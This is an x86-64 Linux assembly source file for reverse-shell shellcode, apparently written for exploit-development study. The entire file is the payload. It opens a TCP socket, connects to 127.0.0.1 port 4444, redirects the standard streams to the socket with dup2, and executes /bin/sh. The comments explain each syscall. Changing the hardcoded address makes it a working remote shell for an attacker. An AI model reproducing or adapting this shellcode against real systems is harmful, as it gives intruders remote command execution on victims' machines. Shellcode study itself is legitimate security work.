section .text
global _start

_start:
	; clearing rax, rdi, rsi, rdx
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	;socket
	add rax, 41 ;syscall number for socket
	add rdi, 2  ;AF_INET param
	add rsi, 1  ;SOCK_STREAM param
	;rdx == 0 IPPROTO_IP == 0
	syscall
	
	mov rdi, rax  ;return value of syscall is in rax, we save it in rdi
	
	;preparing structure for connect
	push 0x0101017f
	push word 0x5c11
	push word 0x2

	;connect
	;rdi already contains the return value from socket syscall. rdi is the first param
	mov rsi, rsp  ;rsi now contains the pointer to the structure. the second param
	add rdx, 0x10
	xor rax, rax
	add rax, 42 ;syscall number for connect
	syscall

	xor rsi, rsi
	add rsi, 2
	loop:
		xor rax, rax
		add rax, 33
		syscall
		dec rsi
		jns loop
		

	;dup2 STDIN
	;xor rax, rax
	;add rax, 33  ;syscall number for dup2
	;xor rsi, rsi
	;add rsi, 0 not necessary because rsi contains 0 yet STDIN
	;syscall

	;dup2 STDOUT
	;xor rax, rax
	;add rax, 33
	;xor rsi, rsi not necessary because already zeroed
	;add rsi, 1 ; STDOUT
	;syscall

	;dup2 STDERR
	;xor rax, rax
	;add rax, 33
	;xor rsi, rsi
	;add rsi, 2 ; STDERR
	;syscall

	;execve("/bin/sh", NULL, NULL)
	xor rax, rax
	mov rdx, rax ; NULL for argument # 3
	mov rsi, rax ; NULL for argument # 2

	push rax
	mov rbx, 0x68732f6e69622f2f ; //bin/sh\0 
	push rbx
	mov rdi, rsp

	add rax, 59
	syscall


	



